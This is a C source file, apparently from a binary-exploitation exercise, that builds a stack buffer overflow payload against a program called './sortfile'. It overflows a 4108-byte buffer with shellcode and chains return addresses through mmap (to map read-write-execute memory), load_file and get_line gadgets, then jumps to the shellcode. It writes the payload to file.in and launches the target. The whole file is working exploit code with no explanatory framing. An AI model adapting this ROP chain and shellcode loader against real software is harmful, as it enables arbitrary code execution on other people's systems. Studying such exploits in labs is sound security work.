#include <inttypes.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

unsigned char shellcode[] = {
#include "shellcode.h"
};

int main(void)
{
  uint32_t mem_addr  = 0x41414000;
  uint32_t mmap_addr = 0x080484c0;

  uint32_t load_file_addr = 0x080485ec;
  uint32_t get_line_addr  = 0x080486cb;

  uint32_t pop7_addr = 0x08048a0b;
  uint32_t pop3_addr = 0x08048a20;

  struct overflow {
    char buf[4108];       /* buffer that we overflow */

    uint32_t call1; /* mmap */
    uint32_t ret1; /* pop7 */
    uint32_t arg1_1;
    uint32_t arg1_2;
    uint32_t arg1_3;
    uint32_t arg1_4;
    uint32_t arg1_5;
    uint32_t arg1_6;

    uint32_t padding1; /* needed as we do not have a pop6 */

    uint32_t call2; /* load_file */

    uint32_t call3; /* get_line */
    uint32_t ret3; /* pop3 */
    uint32_t arg3_1;

    uint32_t padding2;
    uint32_t padding3;

    uint32_t call_shellcode;

  } __attribute__((packed)) overflow;

  /* fill with A's */
  memset(&overflow, 'A', sizeof(overflow));

  /* place the shellcode in the beginning of the buffer */
  memcpy(overflow.buf, shellcode, sizeof(shellcode));

  overflow.call1  = mmap_addr;
  overflow.ret1   = pop7_addr;
  overflow.arg1_1 = mem_addr;
  overflow.arg1_2 = 0x00002000; /* page size = 4K */
  overflow.arg1_3 = 0x00000007; /* R, W, X */
  overflow.arg1_4 = 0x00000032; /* flags */
  overflow.arg1_5 = 0xffffffff; /* file descriptor */
  overflow.arg1_6 = 0x00000000; /* offset */

  overflow.call2  = load_file_addr;

  overflow.call3 = get_line_addr;
  overflow.ret3 = pop3_addr;
  overflow.arg3_1 = mem_addr;

  overflow.call_shellcode = mem_addr;

  /* create or open file */
  int fd = open("file.in", O_WRONLY | O_CREAT, 0644);

  /* make sure file is empty */
  ftruncate(fd, 0);

  /* write file contents */
  write(fd, (char*)&overflow, sizeof(overflow));

  /* close the file */
  close(fd);

  char *argv[] = { "./sortfile", NULL };

  execve(argv[0], argv, NULL);

  return EXIT_FAILURE;
}
